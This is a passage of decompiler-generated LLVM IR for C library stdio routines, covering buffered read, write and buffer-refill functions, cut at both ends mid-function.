  %v3_8055613 = and i8 %v2_8055613, 4
  %v4_8055613 = icmp eq i8 %v3_8055613, 0
  %v1_8055616 = icmp eq i1 %v4_8055613, false
  br i1 %v1_8055616, label %dec_label_pc_8055644, label %dec_label_pc_8055618

dec_label_pc_8055618:                             ; preds = %entry
  %v2_8055618 = icmp slt i32 %arg3, 0
  %v1_805561a = icmp eq i1 %v2_8055618, false
  br i1 %v1_805561a, label %dec_label_pc_8055621, label %dec_label_pc_805561c

dec_label_pc_805561c:                             ; preds = %dec_label_pc_8055618
  br label %dec_label_pc_8055621

dec_label_pc_8055621:                             ; preds = %dec_label_pc_8055618, %dec_label_pc_805561c
  %v0_8055621 = phi i32 [ %arg3, %dec_label_pc_8055618 ], [ 2147483647, %dec_label_pc_805561c ]
  %v1_8055626 = add i32 %v4_805560b, 4
  %v2_8055626 = inttoptr i32 %v1_8055626 to i32*
  %v3_8055626 = load i32, i32* %v2_8055626, align 4
  %v3_8055629 = call i32 @__libc_read(i32 %v3_8055626, i32 %arg2, i32 %v0_8055621)
  store i32 %v3_8055629, i32* %eax.global-to-local, align 4
  %tmp10 = icmp slt i32 %v3_8055629, 1
  %tmp11 = icmp eq i1 %tmp10, false
  br i1 %tmp11, label %dec_label_pc_8055644, label %dec_label_pc_8055636

dec_label_pc_8055636:                             ; preds = %dec_label_pc_8055621
  %v1_8055631 = icmp eq i32 %v3_8055629, 0
  %v4_8055634 = icmp eq i1 %v1_8055631, false
  %v0_805563e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805563e = inttoptr i32 %v0_805563e to i16*
  %v2_805563e = load i16, i16* %v1_805563e, align 2
  br i1 %v4_8055634, label %dec_label_pc_805563e, label %dec_label_pc_8055638

dec_label_pc_8055638:                             ; preds = %dec_label_pc_8055636
  %v3_8055638 = or i16 %v2_805563e, 4
  store i16 %v3_8055638, i16* %v1_805563e, align 2
  %v0_8055645.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055644

dec_label_pc_805563e:                             ; preds = %dec_label_pc_8055636
  %v3_805563e = or i16 %v2_805563e, 8
  store i16 %v3_805563e, i16* %v1_805563e, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055644

dec_label_pc_8055644:                             ; preds = %dec_label_pc_8055621, %entry, %dec_label_pc_8055638, %dec_label_pc_805563e
  %v0_8055645 = phi i32 [ %v3_8055629, %dec_label_pc_8055621 ], [ 0, %entry ], [ %v0_8055645.pre, %dec_label_pc_8055638 ], [ 0, %dec_label_pc_805563e ]
  %v2_8055644 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055644, i32* @ebx, align 4
  ret i32 %v0_8055645

; uselistorder directives
  uselistorder i16 %v2_805563e, { 1, 0 }
  uselistorder i16 4, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_read, { 1, 4, 0, 2, 3 }
  uselistorder i8 4, { 7, 0, 8, 9, 2, 3, 4, 5, 1, 6 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055644, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8055621, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805564b = load i32, i32* @ebx, align 4
  store i32 %v0_805564b, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* %ebp.global-to-local, align 4
  %v4_8055650 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8055650, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v1_80556c74 = icmp eq i32 %arg3, 0
  %v1_80556ca6 = icmp eq i1 %v1_80556c74, false
  br i1 %v1_80556ca6, label %dec_label_pc_805565c.lr.ph, label %dec_label_pc_80556cc

dec_label_pc_805565c.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_805565c

dec_label_pc_805565c:                             ; preds = %dec_label_pc_8055678.dec_label_pc_805565c_crit_edge, %dec_label_pc_805565c.lr.ph
  %v0_8055669 = phi i32 [ %v4_8055650, %dec_label_pc_805565c.lr.ph ], [ %v0_8055669.pre, %dec_label_pc_8055678.dec_label_pc_805565c_crit_edge ]
  %v0_8055668 = phi i32 [ %arg2, %dec_label_pc_805565c.lr.ph ], [ %v2_805567a, %dec_label_pc_8055678.dec_label_pc_805565c_crit_edge ]
  %v0_8055665 = phi i32 [ %arg3, %dec_label_pc_805565c.lr.ph ], [ %v2_8055678, %dec_label_pc_8055678.dec_label_pc_805565c_crit_edge ]
  %v2_80556c77 = icmp slt i32 %v0_8055665, 0
  %v2_805565c = icmp eq i1 %v2_80556c77, false
  %storemerge = select i1 %v2_805565c, i32 %v0_8055665, i32 2147483647
  store i32 %storemerge, i32* @eax, align 4
  %v1_8055669 = add i32 %v0_8055669, 4
  %v2_8055669 = inttoptr i32 %v1_8055669 to i32*
  %v3_8055669 = load i32, i32* %v2_8055669, align 4
  %v4_805566c = call i32 @__GI___libc_write(i32 %v3_8055669, i32 %v0_8055668, i32 %storemerge)
  store i32 %v4_805566c, i32* %eax.global-to-local, align 4
  %v2_8055674 = icmp slt i32 %v4_805566c, 0
  br i1 %v2_8055674, label %dec_label_pc_805567e, label %dec_label_pc_8055678

dec_label_pc_8055678:                             ; preds = %dec_label_pc_805565c
  %v0_8055678 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055678 = sub i32 %v0_8055678, %v4_805566c
  %v12_8055678 = icmp eq i32 %v2_8055678, 0
  store i32 %v2_8055678, i32* %ebx.global-to-local, align 4
  %v0_805567a = load i32, i32* %esi.global-to-local, align 4
  %v2_805567a = add i32 %v0_805567a, %v4_805566c
  store i32 %v2_805567a, i32* %esi.global-to-local, align 4
  %v1_80556ca = icmp eq i1 %v12_8055678, false
  br i1 %v1_80556ca, label %dec_label_pc_8055678.dec_label_pc_805565c_crit_edge, label %dec_label_pc_80556cc

dec_label_pc_8055678.dec_label_pc_805565c_crit_edge: ; preds = %dec_label_pc_8055678
  %v0_8055669.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805565c

dec_label_pc_805567e:                             ; preds = %dec_label_pc_805565c
  %v0_805567e = load i32, i32* %edi.global-to-local, align 4
  %v1_805567e = inttoptr i32 %v0_805567e to i16*
  %v2_805567e = load i16, i16* %v1_805567e, align 2
  %v3_805567e = or i16 %v2_805567e, 8
  store i16 %v3_805567e, i16* %v1_805567e, align 2
  store i32 -8, i32* %eax.global-to-local, align 4
  %v2_8055687 = load i32, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 %v2_8055687, i32* %eax.global-to-local, align 4
  %v9_805568a = icmp eq i32 %v2_8055687, 4
  br i1 %v9_805568a, label %dec_label_pc_8055694, label %dec_label_pc_805568f

dec_label_pc_805568f:                             ; preds = %dec_label_pc_805567e
  %v9_805568f = icmp eq i32 %v2_8055687, 11
  %v1_8055692 = icmp eq i1 %v9_805568f, false
  br i1 %v1_8055692, label %dec_label_pc_80556cc, label %dec_label_pc_8055694

dec_label_pc_8055694:                             ; preds = %dec_label_pc_805568f, %dec_label_pc_805567e
  %v0_8055694 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055694 = add i32 %v0_8055694, 12
  %v2_8055694 = inttoptr i32 %v1_8055694 to i32*
  %v3_8055694 = load i32, i32* %v2_8055694, align 4
  store i32 %v3_8055694, i32* %eax.global-to-local, align 4
  %v1_8055697 = add i32 %v0_8055694, 8
  %v2_8055697 = inttoptr i32 %v1_8055697 to i32*
  %v3_8055697 = load i32, i32* %v2_8055697, align 4
  store i32 %v3_8055697, i32* %edx.global-to-local, align 4
  %v2_805569c = sub i32 %v3_8055694, %v3_8055697
  %v12_805569c = icmp eq i32 %v2_805569c, 0
  store i32 %v2_805569c, i32* %ecx.global-to-local, align 4
  %v1_80556c3.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v12_805569c, label %dec_label_pc_80556c3, label %dec_label_pc_80556a0

dec_label_pc_80556a0:                             ; preds = %dec_label_pc_8055694
  %tmp28 = icmp ugt i32 %v2_805569c, %v1_80556c3.pre
  br i1 %tmp28, label %dec_label_pc_80556a4, label %dec_label_pc_80556a6.preheader

dec_label_pc_80556a4:                             ; preds = %dec_label_pc_80556a0
  store i32 %v1_80556c3.pre, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80556a6.preheader

dec_label_pc_80556a6.preheader:                   ; preds = %dec_label_pc_80556a0, %dec_label_pc_80556a4
  %v0_80556a6.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80556a6

dec_label_pc_80556a6:                             ; preds = %dec_label_pc_80556a6.preheader, %dec_label_pc_80556b8
  %v2_80556a8 = phi i32 [ %v3_8055697, %dec_label_pc_80556a6.preheader ], [ %v1_80556b4, %dec_label_pc_80556b8 ]
  %v4_80556a6 = phi i32 [ %v3_8055694, %dec_label_pc_80556a6.preheader ], [ %v0_80556aa, %dec_label_pc_80556b8 ]
  %v0_80556a6 = phi i32 [ %v0_80556a6.pre, %dec_label_pc_80556a6.preheader ], [ %v1_80556b8, %dec_label_pc_80556b8 ]
  %v1_80556a6 = inttoptr i32 %v0_80556a6 to i8*
  %v2_80556a6 = load i8, i8* %v1_80556a6, align 1
  %v3_80556a6 = zext i8 %v2_80556a6 to i32
  %v5_80556a6 = and i32 %v4_80556a6, -256
  %v6_80556a6 = or i32 %v3_80556a6, %v5_80556a6
  store i32 %v6_80556a6, i32* %eax.global-to-local, align 4
  %v3_80556a8 = inttoptr i32 %v2_80556a8 to i8*
  store i8 %v2_80556a6, i8* %v3_80556a8, align 1
  %v0_80556aa = load i32, i32* %eax.global-to-local, align 4
  %v1_80556aa = trunc i32 %v0_80556aa to i8
  %v10_80556aa = icmp eq i8 %v1_80556aa, 10
  %v1_80556ac = icmp eq i1 %v10_80556aa, false
  br i1 %v1_80556ac, label %dec_label_pc_80556b4, label %dec_label_pc_80556ae

dec_label_pc_80556ae:                             ; preds = %dec_label_pc_80556a6
  %v0_80556ae = load i32, i32* %edi.global-to-local, align 4
  %v1_80556ae = add i32 %v0_80556ae, 1
  %v2_80556ae = inttoptr i32 %v1_80556ae to i8*
  %v3_80556ae = load i8, i8* %v2_80556ae, align 1
  %v4_80556ae = urem i8 %v3_80556ae, 2
  %v5_80556ae = icmp eq i8 %v4_80556ae, 0
  %v1_80556b2 = icmp eq i1 %v5_80556ae, false
  br i1 %v1_80556b2, label %dec_label_pc_80556ae.dec_label_pc_80556bb_crit_edge, label %dec_label_pc_80556b4

dec_label_pc_80556ae.dec_label_pc_80556bb_crit_edge: ; preds = %dec_label_pc_80556ae
  %v0_80556bb.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80556bb

dec_label_pc_80556b4:                             ; preds = %dec_label_pc_80556ae, %dec_label_pc_80556a6
  %v0_80556b4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80556b4 = add i32 %v0_80556b4, 1
  store i32 %v1_80556b4, i32* %edx.global-to-local, align 4
  %v0_80556b5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80556b5 = add i32 %v0_80556b5, -1
  %v8_80556b5 = icmp eq i32 %v1_80556b5, 0
  store i32 %v1_80556b5, i32* %ecx.global-to-local, align 4
  br i1 %v8_80556b5, label %dec_label_pc_80556b4.dec_label_pc_80556bb_crit_edge, label %dec_label_pc_80556b8

dec_label_pc_80556b4.dec_label_pc_80556bb_crit_edge: ; preds = %dec_label_pc_80556b4
  %v1_80556bb.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80556bb

dec_label_pc_80556b8:                             ; preds = %dec_label_pc_80556b4
  %v0_80556b8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80556b8 = add i32 %v0_80556b8, 1
  store i32 %v1_80556b8, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80556a6

dec_label_pc_80556bb:                             ; preds = %dec_label_pc_80556b4.dec_label_pc_80556bb_crit_edge, %dec_label_pc_80556ae.dec_label_pc_80556bb_crit_edge
  %v1_80556bb = phi i32 [ %v0_80556ae, %dec_label_pc_80556ae.dec_label_pc_80556bb_crit_edge ], [ %v1_80556bb.pre, %dec_label_pc_80556b4.dec_label_pc_80556bb_crit_edge ]
  %v0_80556bb = phi i32 [ %v0_80556bb.pre, %dec_label_pc_80556ae.dec_label_pc_80556bb_crit_edge ], [ %v1_80556b4, %dec_label_pc_80556b4.dec_label_pc_80556bb_crit_edge ]
  %v2_80556bb = add i32 %v1_80556bb, 16
  %v3_80556bb = inttoptr i32 %v2_80556bb to i32*
  store i32 %v0_80556bb, i32* %v3_80556bb, align 4
  %v0_80556be = load i32, i32* %edx.global-to-local, align 4
  %v1_80556be = load i32, i32* %edi.global-to-local, align 4
  %v2_80556be = add i32 %v1_80556be, 8
  %v3_80556be = inttoptr i32 %v2_80556be to i32*
  %v4_80556be = load i32, i32* %v3_80556be, align 4
  %v5_80556be = sub i32 %v0_80556be, %v4_80556be
  store i32 %v5_80556be, i32* %edx.global-to-local, align 4
  %v0_80556c1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80556c1 = sub i32 %v0_80556c1, %v5_80556be
  store i32 %v2_80556c1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80556c3

dec_label_pc_80556c3:                             ; preds = %dec_label_pc_8055694, %dec_label_pc_80556bb
  %v1_80556c3 = phi i32 [ %v2_80556c1, %dec_label_pc_80556bb ], [ %v1_80556c3.pre, %dec_label_pc_8055694 ]
  %v0_80556c3 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80556c3 = sub i32 %v0_80556c3, %v1_80556c3
  store i32 %v2_80556c3, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80556cc

dec_label_pc_80556cc:                             ; preds = %dec_label_pc_8055678, %entry, %dec_label_pc_805568f, %dec_label_pc_80556c3
  %v0_80556cc = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_80556cc, i32* %eax.global-to-local, align 4
  %v2_80556ce = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80556ce, i32* @ebx, align 4
  ret i32 %v0_80556cc

; uselistorder directives
  uselistorder i32 %v1_80556b8, { 1, 0 }
  uselistorder i32 %v1_80556b5, { 1, 0 }
  uselistorder i32 %v1_80556b4, { 0, 2, 1 }
  uselistorder i32 %v0_80556aa, { 1, 0 }
  uselistorder i32 %v1_80556c3.pre, { 1, 2, 0 }
  uselistorder i32 %v2_805567a, { 1, 0 }
  uselistorder i32 %v2_8055678, { 1, 2, 0 }
  uselistorder i32 %v4_805566c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8055665, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 3, 4, 5, 1, 6 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 1, 3 }
  uselistorder i8 0, { 171, 172, 168, 169, 29, 13, 174, 173, 12, 175, 14, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 196, 192, 193, 194, 195, 15, 197, 199, 210, 113, 211, 200, 201, 202, 198, 203, 204, 205, 206, 207, 208, 30, 209, 104, 212, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 10, 128, 129, 130, 131, 45, 46, 47, 42, 43, 48, 0, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 17, 18, 19, 20, 21, 22, 23, 24, 25, 59, 60, 61, 62, 63, 11, 64, 65, 16, 66, 67, 68, 69, 70, 71, 72, 73, 31, 74, 75, 28, 1, 76, 77, 78, 2, 79, 80, 81, 82, 83, 3, 26, 4, 84, 85, 86, 87, 5, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 6, 27, 98, 7, 99, 100, 101, 102, 103, 105, 106, 8, 107, 108, 109, 110, 111, 112, 132, 133, 135, 134, 136, 137, 138, 140, 141, 142, 143, 144, 145, 146, 147, 139, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 41, 160, 9, 161, 32, 162, 163, 164, 165, 166, 167, 170, 213, 44, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i8 2, { 5, 6, 15, 29, 25, 7, 26, 8, 9, 10, 11, 12, 27, 28, 13, 14, 0, 19, 20, 17, 18, 21, 22, 1, 2, 3, 4, 23, 16, 24 }
  uselistorder i8 10, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 14, 15, 16, 11, 12, 13, 10 }
  uselistorder i32 -256, { 125, 122, 0, 126, 3, 128, 127, 2, 129, 130, 131, 132, 133, 134, 135, 137, 136, 4, 138, 139, 101, 142, 143, 140, 141, 76, 82, 83, 84, 85, 86, 118, 119, 87, 88, 89, 27, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 40, 38, 42, 39, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 1, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 77, 78, 79, 80, 81, 90, 91, 92, 93, 94, 95, 96, 98, 97, 99, 100, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 120, 121, 123, 124, 144, 145 }
  uselistorder i32 11, { 1, 19, 16, 24, 25, 0, 12, 13, 10, 14, 11, 15, 2, 3, 17, 4, 18, 20, 21, 7, 8, 9, 22, 5, 6, 23 }
  uselistorder i32 (i32, i32, i32)* @__GI___libc_write, { 0, 2, 1 }
  uselistorder i32 4, { 25, 479, 480, 208, 209, 210, 206, 207, 481, 26, 482, 483, 484, 485, 486, 487, 488, 5, 489, 81, 490, 491, 492, 494, 495, 496, 497, 498, 499, 510, 32, 511, 556, 6, 211, 212, 213, 214, 269, 270, 215, 216, 557, 558, 559, 563, 564, 566, 567, 109, 568, 7, 560, 561, 562, 110, 111, 435, 436, 437, 438, 82, 8, 158, 565, 514, 515, 516, 517, 518, 519, 520, 9, 521, 522, 523, 524, 525, 526, 527, 528, 512, 513, 112, 500, 501, 502, 503, 504, 505, 506, 507, 10, 509, 508, 493, 11, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 23, 550, 551, 552, 554, 555, 553, 12, 217, 218, 219, 220, 120, 13, 1, 14, 16, 15, 271, 272, 273, 274, 275, 17, 276, 83, 113, 121, 376, 377, 122, 221, 224, 225, 173, 174, 226, 227, 228, 229, 178, 230, 231, 170, 171, 172, 175, 176, 177, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 159, 232, 233, 234, 235, 236, 237, 238, 222, 223, 114, 244, 245, 84, 152, 115, 123, 33, 239, 116, 240, 241, 242, 243, 37, 36, 27, 39, 246, 247, 248, 249, 250, 34, 35, 38, 251, 253, 254, 252, 255, 256, 257, 258, 259, 124, 85, 0, 260, 261, 40, 262, 263, 264, 265, 266, 267, 41, 268, 277, 42, 125, 126, 278, 279, 280, 281, 282, 283, 284, 43, 285, 286, 287, 288, 44, 127, 289, 290, 291, 292, 45, 18, 293, 296, 294, 295, 297, 298, 299, 300, 301, 302, 86, 153, 87, 88, 303, 305, 304, 306, 307, 308, 309, 89, 90, 91, 310, 311, 312, 313, 314, 316, 315, 317, 318, 319, 320, 92, 93, 94, 321, 322, 325, 323, 324, 117, 2, 118, 326, 327, 328, 19, 329, 330, 331, 332, 95, 154, 96, 97, 333, 334, 335, 20, 336, 337, 338, 339, 98, 155, 99, 100, 340, 343, 341, 342, 3, 344, 345, 346, 347, 348, 349, 350, 351, 46, 47, 101, 156, 102, 119, 352, 353, 356, 354, 355, 358, 359, 360, 361, 128, 357, 103, 157, 104, 105, 48, 362, 363, 370, 364, 365, 366, 129, 367, 130, 131, 368, 369, 372, 373, 374, 375, 132, 371, 106, 107, 108, 197, 198, 199, 200, 201, 202, 203, 204, 59, 378, 53, 54, 52, 379, 380, 77, 51, 381, 382, 383, 28, 133, 134, 135, 55, 136, 56, 137, 4, 49, 60, 61, 29, 384, 62, 138, 63, 139, 64, 57, 58, 65, 66, 67, 140, 68, 69, 70, 141, 71, 142, 143, 72, 144, 73, 145, 385, 146, 74, 147, 75, 148, 386, 149, 150, 387, 76, 388, 389, 390, 391, 78, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 50, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 429, 428, 430, 431, 432, 79, 30, 21, 433, 80, 151, 434, 439, 160, 440, 441, 442, 161, 443, 444, 445, 162, 446, 447, 448, 163, 449, 450, 451, 164, 452, 453, 454, 165, 455, 456, 457, 166, 458, 459, 460, 167, 461, 462, 463, 168, 464, 465, 466, 169, 467, 468, 469, 470, 471, 22, 472, 473, 474, 475, 31, 24, 476, 477, 478, 569, 205 }
  uselistorder i32 2147483647, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_80556cc, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_80556c3, { 1, 0 }
  uselistorder label %dec_label_pc_80556a6, { 1, 0 }
  uselistorder label %dec_label_pc_80556a6.preheader, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80556d4 = load i32, i32* @ebx, align 4
  store i32 %v0_80556d4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80556d9 = add i32 %arg1, 8
  %v2_80556d9 = inttoptr i32 %v1_80556d9 to i32*
  %v3_80556d9 = load i32, i32* %v2_80556d9, align 4
  store i32 %v3_80556d9, i32* %edx.global-to-local, align 4
  %v1_80556dc = add i32 %arg1, 12
  %v2_80556dc = inttoptr i32 %v1_80556dc to i32*
  %v3_80556dc = load i32, i32* %v2_80556dc, align 4
  %v2_80556df = sub i32 %v3_80556dc, %v3_80556d9
  %v3_80556e4 = inttoptr i32 %arg1 to i16*
  %v4_80556e4 = call i32 @__stdio_READ(i16* %v3_80556e4, i32 %v3_80556d9, i32 %v2_80556df)
  %v0_80556e9 = load i32, i32* @ebx, align 4
  %v1_80556e9 = add i32 %v0_80556e9, 8
  %v2_80556e9 = inttoptr i32 %v1_80556e9 to i32*
  %v3_80556e9 = load i32, i32* %v2_80556e9, align 4
  store i32 %v3_80556e9, i32* %edx.global-to-local, align 4
  %v2_80556ef = add i32 %v0_80556e9, 16
  %v3_80556ef = inttoptr i32 %v2_80556ef to i32*
  store i32 %v3_80556e9, i32* %v3_80556ef, align 4
  %v0_80556f2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80556f2 = add i32 %v0_80556f2, %v4_80556e4
  store i32 %v2_80556f2, i32* %edx.global-to-local, align 4
  %v1_80556f4 = load i32, i32* @ebx, align 4
  %v2_80556f4 = add i32 %v1_80556f4, 20
  %v3_80556f4 = inttoptr i32 %v2_80556f4 to i32*
  store i32 %v2_80556f2, i32* %v3_80556f4, align 4
  %v2_80556f7 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80556f7, i32* @ebx, align 4
  ret i32 %v4_80556e4

; uselistorder directives
  uselistorder i32 %v4_80556e4, { 1, 0 }
  uselistorder i32 20, { 112, 37, 113, 114, 115, 116, 117, 119, 120, 21, 1, 123, 38, 47, 48, 39, 40, 124, 107, 108, 109, 110, 11, 32, 31, 121, 122, 118, 49, 41, 50, 51, 2, 22, 23, 24, 25, 26, 27, 42, 43, 44, 45, 46, 3, 28, 4, 13, 29, 30, 52, 53, 5, 6, 54, 55, 14, 56, 57, 58, 60, 61, 15, 59, 62, 63, 64, 65, 66, 68, 69, 16, 67, 70, 71, 72, 73, 74, 76, 77, 17, 75, 78, 79, 80, 82, 83, 18, 81, 84, 85, 86, 88, 87, 89, 90, 91, 92, 93, 94, 95, 97, 19, 0, 20, 96, 98, 99, 102, 100, 101, 103, 33, 34, 35, 36, 8, 9, 7, 10, 104, 105, 106, 12, 111 }
  uselistorder i32 16, { 256, 257, 86, 87, 88, 0, 258, 259, 85, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 25, 16, 275, 276, 280, 89, 90, 120, 121, 91, 92, 283, 284, 189, 39, 76, 18, 277, 278, 3, 27, 279, 1, 19, 274, 281, 20, 282, 2, 21, 122, 123, 40, 61, 75, 54, 62, 55, 63, 56, 64, 28, 78, 29, 79, 93, 65, 80, 30, 77, 66, 67, 68, 69, 70, 94, 95, 71, 96, 57, 97, 98, 99, 100, 4, 5, 17, 22, 6, 41, 31, 101, 102, 72, 103, 104, 32, 105, 106, 107, 108, 109, 110, 58, 59, 42, 111, 112, 113, 114, 115, 116, 117, 118, 119, 124, 125, 126, 127, 128, 23, 60, 175, 43, 129, 130, 131, 44, 132, 133, 134, 136, 137, 45, 138, 135, 139, 46, 47, 140, 141, 48, 142, 143, 8, 7, 144, 145, 49, 146, 147, 50, 148, 149, 9, 150, 151, 51, 152, 153, 154, 155, 10, 156, 26, 11, 13, 157, 12, 14, 159, 160, 34, 161, 33, 162, 158, 163, 24, 52, 164, 165, 166, 53, 167, 168, 169, 170, 173, 171, 172, 174, 176, 177, 178, 179, 180, 181, 182, 183, 184, 187, 185, 186, 188, 81, 82, 83, 84, 190, 191, 192, 193, 197, 198, 199, 200, 194, 195, 196, 201, 202, 203, 204, 207, 208, 36, 37, 209, 210, 15, 211, 212, 213, 214, 215, 216, 205, 206, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 35, 233, 38, 234, 235, 236, 237, 238, 239, 240, 241, 242, 73, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 74 }
  uselistorder i32 12, { 166, 167, 100, 101, 102, 168, 169, 170, 171, 172, 175, 182, 183, 103, 104, 125, 105, 106, 216, 77, 217, 165, 89, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 176, 177, 178, 179, 180, 181, 173, 174, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 82, 215, 3, 83, 84, 126, 127, 128, 129, 130, 79, 85, 80, 86, 81, 87, 107, 112, 108, 109, 110, 90, 91, 92, 99, 93, 94, 95, 96, 97, 98, 111, 78, 113, 114, 116, 117, 118, 119, 120, 121, 123, 88, 122, 115, 34, 33, 36, 124, 32, 35, 0, 37, 38, 39, 40, 41, 42, 152, 131, 73, 132, 133, 134, 135, 136, 137, 138, 139, 140, 74, 141, 142, 143, 75, 144, 145, 146, 147, 148, 43, 76, 149, 150, 151, 44, 153, 154, 155, 9, 8, 10, 26, 54, 16, 48, 49, 47, 17, 71, 21, 46, 156, 7, 50, 51, 5, 157, 45, 55, 56, 57, 58, 59, 52, 53, 18, 60, 19, 20, 61, 62, 63, 158, 64, 65, 66, 67, 68, 69, 70, 159, 72, 160, 162, 161, 6, 11, 12, 13, 14, 15, 22, 23, 24, 4, 25, 163, 164, 27, 218, 28, 29, 30, 31, 1, 2 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80556fc = load i32, i32* @ebx, align 4
  store i32 %v0_80556fc, i32* %stack_var_-4, align 4
  %v4_80556fd = ptrtoint i16* %arg1 to i32
  store i32 %v4_80556fd, i32* @ebx, align 4
  %v1_8055705 = bitcast i16* %arg1 to i32*
  %v2_8055705 = load i32, i32* %v1_8055705, align 4
  %v1_8055707 = urem i32 %v2_8055705, 65536
  %v2_805570a = and i32 %v1_8055707, %arg2
  %v3_805570a = icmp eq i32 %v2_805570a, 0
  %v1_805570c = icmp eq i1 %v3_805570a, false
  br i1 %v1_805570c, label %dec_label_pc_805571b, label %dec_label_pc_805570e

dec_label_pc_805570e:                             ; preds = %entry
  %v1_805570e = and i32 %v2_8055705, 2176
  %v2_805570e = icmp eq i32 %v1_805570e, 0
  %v1_8055714 = icmp eq i1 %v2_805570e, false
  br i1 %v1_8055714, label %dec_label_pc_8055722, label %dec_label_pc_8055716

dec_label_pc_8055716:                             ; preds = %dec_label_pc_805570e
  %v2_8055716 = or i32 %v2_8055705, %arg2
  %v1_8055718 = trunc i32 %v2_8055716 to i16
  store i16 %v1_8055718, i16* %arg1, align 2
  %v0_805571b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805571b

dec_label_pc_805571b:                             ; preds = %entry, %dec_label_pc_8055716
  %v0_805573b = phi i32 [ %v4_80556fd, %entry ], [ %v0_805571b.pre, %dec_label_pc_8055716 ]
  %v1_805571b = inttoptr i32 %v0_805573b to i16*
  %v2_805571b = load i16, i16* %v1_805571b, align 2
  %v2_805571e = and i16 %v2_805571b, 16
